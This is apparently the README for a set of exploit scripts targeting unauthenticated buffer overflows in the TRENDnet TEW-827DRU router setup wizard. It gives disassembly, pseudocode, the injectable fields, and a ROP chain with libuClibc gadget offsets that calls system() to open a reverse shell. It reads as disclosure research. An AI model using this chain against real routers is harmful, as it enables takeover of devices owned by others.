## CVE Number Here

These scripts exercise an unauthenticated vulnerability in the TRENDNet TEW-827DRU H/W 2.0 F/W 2.04 to open and connect
to a reverse shell.

The router allows unauthenticated access to the setup wizard functionality which contains a multitude of buffer overflows.
There are five exploitable paths within the wizard: DHCP, L2TP, DHCP(mac), PPTP, and static.

## wizard_dhcp_overflow.py
Within the setup wizard there is a buffer overflow processing the primary and secondary DNS servers while configuring 
the router for DHCP WAN. The vulnerable disassembly is shown below. `cameo.wan.wan_primary_dns` or `wan_secondary_dns` 
can be used for exploitation, this script uses `cameo.wan.wan_secondary_dns`.

``` 
LOAD:0043BA60                 addiu   $s1, $v0, (aSS_0 - 0x4D0000)  # "%s %s"
LOAD:0043BA64                 la      $v0, aTDelay     # "t_delay"
LOAD:0043BA68                 nop
LOAD:0043BA6C                 addiu   $a0, $v0, (aCameoWanWanPri_0 - 0x4C0000)  # "cameo.wan.wan_primary_dns"
LOAD:0043BA70                 la      $v0, safe_getenv
LOAD:0043BA74                 nop
LOAD:0043BA78                 move    $t9, $v0
LOAD:0043BA7C                 bal     safe_getenv
LOAD:0043BA80                 nop
LOAD:0043BA84                 lw      $gp, 0xA8+saved_gp($fp)
LOAD:0043BA88                 move    $s0, $v0
LOAD:0043BA8C                 la      $v0, aTDelay     # "t_delay"
LOAD:0043BA90                 nop
LOAD:0043BA94                 addiu   $a0, $v0, (aCameoWanWanSec_0 - 0x4C0000)  # "cameo.wan.wan_secondary_dns"
LOAD:0043BA98                 la      $v0, safe_getenv
LOAD:0043BA9C                 nop
LOAD:0043BAA0                 move    $t9, $v0
LOAD:0043BAA4                 bal     safe_getenv
LOAD:0043BAA8                 nop
LOAD:0043BAAC                 lw      $gp, 0xA8+saved_gp($fp)
LOAD:0043BAB0                 addiu   $v1, $fp, 0xA8+var_90
LOAD:0043BAB4                 move    $a0, $v1         # s
LOAD:0043BAB8                 move    $a1, $s1         # format
LOAD:0043BABC                 move    $a2, $s0
LOAD:0043BAC0                 move    $a3, $v0
LOAD:0043BAC4                 la      $v0, sprintf
LOAD:0043BAC8                 nop
LOAD:0043BACC                 move    $t9, $v0
LOAD:0043BAD0                 jalr    $t9 ; sprintf
LOAD:0043BAD4                 nop
```

Pseudo code:
```C
wan_primary_dns = safe_getenv("cameo.wan.wan_primary_dns");
wan_secondary_dns = safe_getenv("cameo.wan.wan_secondary_dns");

sprintf(var_94, "%s %s", wan_primary_dns, wan_secondary_dns);
```

## wizard_l2tp_overflow.py
Within the setup wizard there is a buffer overflow processing all user defined values to `do_wizard_wan_l2tp_cgi` 
function. The vulnerable disassembly for the first user processed value, `system.@system[0].hostname` is shown below.

```
LOAD:0043DAB0                 addiu   $s0, $v0, (aUciSetNetworkW_0 - 0x4D0000)  # "uci set network.wan.hostname=%s"
LOAD:0043DAB4                 la      $v0, aTDelay     # "t_delay"
LOAD:0043DAB8                 nop
LOAD:0043DABC                 addiu   $a0, $v0, (aSystemSystem0H_0 - 0x4C0000)  # "system.@system[0].hostname"
LOAD:0043DAC0                 la      $v0, safe_getenv
LOAD:0043DAC4                 nop
LOAD:0043DAC8                 move    $t9, $v0
LOAD:0043DACC                 bal     safe_getenv
LOAD:0043DAD0                 nop
LOAD:0043DAD4                 lw      $gp, 0x138+saved_gp($fp)
LOAD:0043DAD8                 addiu   $v1, $fp, 0x138+var_114
LOAD:0043DADC                 move    $a0, $v1         # s
LOAD:0043DAE0                 move    $a1, $s0         # format
LOAD:0043DAE4                 move    $a2, $v0
LOAD:0043DAE8                 la      $v0, sprintf
LOAD:0043DAEC                 nop
LOAD:0043DAF0                 move    $t9, $v0
LOAD:0043DAF4                 jalr    $t9 ; sprintf
LOAD:0043DAF8                 nop
```

`system.@system[0].hostname` is used for exploitation in this script, but can be replaced with other user controllable 
values requiring minimal changes to the exploit. The other valid values are:

* `cameo.wan.wan_l2tp_server_ip`
* `cameo.wan.wan_l2tp_username`
* `cameo.wan.wan_l2tp_password`
* `cameo.wan.wan_l2tp_ipaddr` (requires `cameo.wan.wan_l2tp_dynamic` != 1)
* `cameo.wan.wan_l2tp_netmask` (requires `cameo.wan.wan_l2tp_dynamic` != 1)
* `cameo.wan.wan_l2tp_gateway` (requires `cameo.wan.wan_l2tp_dynamic` != 1)

Pseudo Code:
```
hostname = safe_getenv("system.@system[0].hostame");
sprintf(var_114, "uci set network.wan.hostname=%s", hostname);
```

## wizard_mac_overflow.py
Within the setup wizard there is a buffer overflow processing the MAC address after setting DHCP WAN parameters. This 
code is in a different function from the exploit seen in wizard_dhcp_overflow.py but that path must be 
taken for this code path to be taken. The vulnerable disassembly is shown below.
```
LOAD:0043EE30                 addiu   $a0, $v0, (aCameoWanWanMac - 0x4C0000)  # "cameo.wan.wan_mac"
LOAD:0043EE34                 la      $v0, safe_getenv
LOAD:0043EE38                 nop
LOAD:0043EE3C                 move    $t9, $v0
LOAD:0043EE40                 bal     safe_getenv
LOAD:0043EE44                 nop
LOAD:0043EE48                 lw      $gp, 0x128+saved_gp($fp)
LOAD:0043EE4C                 sw      $v0, 0x128+var_10C($fp)
LOAD:0043EE50                 lw      $v0, 0x128+arg_0($fp)
LOAD:0043EE54                 nop
LOAD:0043EE58                 beqz    $v0, loc_43EEBC
...
LOAD:0043EEBC                 la      $v0, aIdge       # "idge"
LOAD:0043EEC0                 nop
LOAD:0043EEC4                 addiu   $v0, (aUciSetNetworkW_5 - 0x4D0000)  # "uci set network.wan.macaddr=%s"
LOAD:0043EEC8                 addiu   $v1, $fp, 0x128+var_108
LOAD:0043EECC                 move    $a0, $v1         # s
LOAD:0043EED0                 move    $a1, $v0         # format
LOAD:0043EED4                 lw      $a2, 0x128+var_10C($fp)
LOAD:0043EED8                 la      $v0, sprintf
LOAD:0043EEDC                 nop
LOAD:0043EEE0                 move    $t9, $v0
LOAD:0043EEE4                 jalr    $t9 ; sprintf
LOAD:0043EEE8                 nop
```

Pseudo Code:
```
wan_mac = safe_getenv("cameo.wan.wan_mac");
sprintf(var_108, "uci set network.wan.macaddr=%s", wan_mac);
```

## wizard_pptp_overflow.py
Within the setup wizard there is a buffer overflow processing all user defined values to the do_wizard_wan_pptp_cgi 
function. The vulnerable disassembly for the first user processed value, `system.@system[0].hostname` is shown below.

```
LOAD:0043C708                 addiu   $s0, $v0, (aUciSetNetworkW_0 - 0x4D0000)  # "uci set network.wan.hostname=%s"
LOAD:0043C70C                 la      $v0, aTDelay     # "t_delay"
LOAD:0043C710                 nop
LOAD:0043C714                 addiu   $a0, $v0, (aSystemSystem0H_0 - 0x4C0000)  # "system.@system[0].hostname"
LOAD:0043C718                 la      $v0, safe_getenv
LOAD:0043C71C                 nop
LOAD:0043C720                 move    $t9, $v0
LOAD:0043C724                 bal     safe_getenv
LOAD:0043C728                 nop
LOAD:0043C72C                 lw      $gp, 0x138+saved_gp($fp)
LOAD:0043C730                 addiu   $v1, $fp, 0x138+var_114
LOAD:0043C734                 move    $a0, $v1         # s
LOAD:0043C738                 move    $a1, $s0         # format
LOAD:0043C73C                 move    $a2, $v0
LOAD:0043C740                 la      $v0, sprintf
LOAD:0043C744                 nop
LOAD:0043C748                 move    $t9, $v0
LOAD:0043C74C                 jalr    $t9 ; sprintf
LOAD:0043C750                 nop
```

`system.@system[0].hostname` is used for exploitation in this script, but can be replace with other user controllable 
values requiring minimal changes to the exploit. The other valid values are:
* `cameo.wan.wan_pptp_server_ip`
* `cameo.wan.wan_pptp_username`
* `cameo.wan.wan_pptp_password`
* `cameo.wan.wan_pptp_ipaddr` (requires `cameo.wan.wan_pptp_dynamic` != 1)
* `cameo.wan.wan_pptp_netmask` (requires `cameo.wan.wan_pptp_dynamic` != 1)
* `cameo.wan.wan_pptp_gateway` (requires `cameo.wan.wan_pptp_dynamic` != 1)

Pseudo Code:
```
hostname = safe_getenv("system.@system[0].hostame");
sprintf(var_114, "uci set network.wan.hostname=%s", hostname);
```

## wizard_static_overflow.py
Within the setup wizard there is a buffer overflow processing the primary and secondary DNS servers while configuring 
the router for static WAN. The vulnerable disassembly is shown below. `cameo.wan.wan_primary_dns` or 
`cameo.wan.wan_secondary_dns` can be used for exploitation, this script uses `cameo.wan.wan_secondary_dns`.

```
LOAD:0043BC10                 addiu   $s1, $v0, (aSS_0 - 0x4D0000)  # "%s %s"
LOAD:0043BC14                 la      $v0, aTDelay     # "t_delay"
LOAD:0043BC18                 nop
LOAD:0043BC1C                 addiu   $a0, $v0, (aCameoWanWanPri_0 - 0x4C0000)  # "cameo.wan.wan_primary_dns"
LOAD:0043BC20                 la      $v0, safe_getenv
LOAD:0043BC24                 nop
LOAD:0043BC28                 move    $t9, $v0
LOAD:0043BC2C                 bal     safe_getenv
LOAD:0043BC30                 nop
LOAD:0043BC34                 lw      $gp, 0xB0+var_A0($fp)
LOAD:0043BC38                 move    $s0, $v0
LOAD:0043BC3C                 la      $v0, aTDelay     # "t_delay"
LOAD:0043BC40                 nop
LOAD:0043BC44                 addiu   $a0, $v0, (aCameoWanWanSec_0 - 0x4C0000)  # "cameo.wan.wan_secondary_dns"
LOAD:0043BC48                 la      $v0, safe_getenv
LOAD:0043BC4C                 nop
LOAD:0043BC50                 move    $t9, $v0
LOAD:0043BC54                 bal     safe_getenv
LOAD:0043BC58                 nop
LOAD:0043BC5C                 lw      $gp, 0xB0+var_A0($fp)
LOAD:0043BC60                 addiu   $v1, $fp, 0xB0+var_94
LOAD:0043BC64                 move    $a0, $v1         # s
LOAD:0043BC68                 move    $a1, $s1         # format
LOAD:0043BC6C                 move    $a2, $s0
LOAD:0043BC70                 move    $a3, $v0
LOAD:0043BC74                 la      $v0, sprintf
LOAD:0043BC78                 nop
LOAD:0043BC7C                 move    $t9, $v0
LOAD:0043BC80                 jalr    $t9 ; sprintf
LOAD:0043BC84                 nop
```

Pseudo code:
```C
wan_primary_dns = safe_getenv("cameo.wan.wan_primary_dns");
wan_secondary_dns = safe_getenv("cameo.wan.wan_secondary_dns");

sprintf(var_94, "%s %s", wan_primary_dns, wan_secondary_dns);
```

## ROP Gadgets
The same ROP chain is used for every exploit and all gadgets come from `libuClibc-0.9.33.2.so`. The cgi file that 
contains the exploit was compiled with library randomization enabled meaning it is loaded at a random address each time 
it is run. Because of this the exploit must be repeatedly thrown until `libuClibc` gets loaded at the address used as 
the base in the exploit. Sometimes this is quick, sometimes it takes a few minutes. A valid load address was found 
through UART debugging and repeatedly throwing the exploit until one of the processes blocked. Once the process was 
blocked I examined the process mapping and used the loaded address of `libuClibc` for the base in all the exploits. 

The ROP chain used in the exploit is shown below.

#### ROP1
This router has rather odd behavior, instead of using temporary 's' registers within the function it uses $v0
and $v1 to move arguments around. Because of this the functions that contain the exploit only save `$fp` and `$ra` which is 
kinda hard to make useful chains with one registers. The first rop gadget gives us control of `$s0` - `$s6` to give us a 
larger variety of gadgets.

#### ROP2
The address of system ends in 0x20, ASCII for space, which we can't send in the URL without encoding. So, we replace the 0x20 
with 0x1C and use this gadget to increment the address of system to the proper address.

#### ROP3
Grab a string off the stack and call system with it.

```

---------------------------------------------------------------
| Gadget Name | Gadget Offset | Gadget Summary                |
---------------------------------------------------------------
| rop1        | 0x0003E164    | lw      $ra, 0x40+var_4($sp)  | $ra will be address of ROP2
|             |               | lw      $s6, 0x40+var_8($sp)  |
|             |               | lw      $s5, 0x40+var_C($sp)  |
|             |               | lw      $s4, 0x40+var_10($sp) |
|             |               | lw      $s3, 0x40+var_14($sp) |
|             |               | lw      $s2, 0x40+var_18($sp) |
|             |               | lw      $s1, 0x40+var_1C($sp) |
|             |               | lw      $s0, 0x40+var_20($sp) |
|             |               | jr      $ra                   |
|             |               | addiu   $sp, 0x40             |
---------------------------------------------------------------
| rop2        | 0x00053168    | addiu   $s3, 4                | Address of system is in $s3
|             |               | move    $t9, $s5              | Address of ROP3 in $s5
|             |               | jalr    $t9                   |
|             |               | lw      $a0, 0($s3)           |
---------------------------------------------------------------
| rop3        | 0x0003CA64    | addiu   $a0, $sp, 0x70+var_48 | Command is on the stack at this offset.
|             |               | li      $a1, 1                |
|             |               | move    $t9, $s3              | Move system to $t9
|             |               | jalr    $t9                   |
|             |               | move    $a2, $s5              |
---------------------------------------------------------------

```

## Example Output

![Example Output](./img/dhcp_overflow.png)
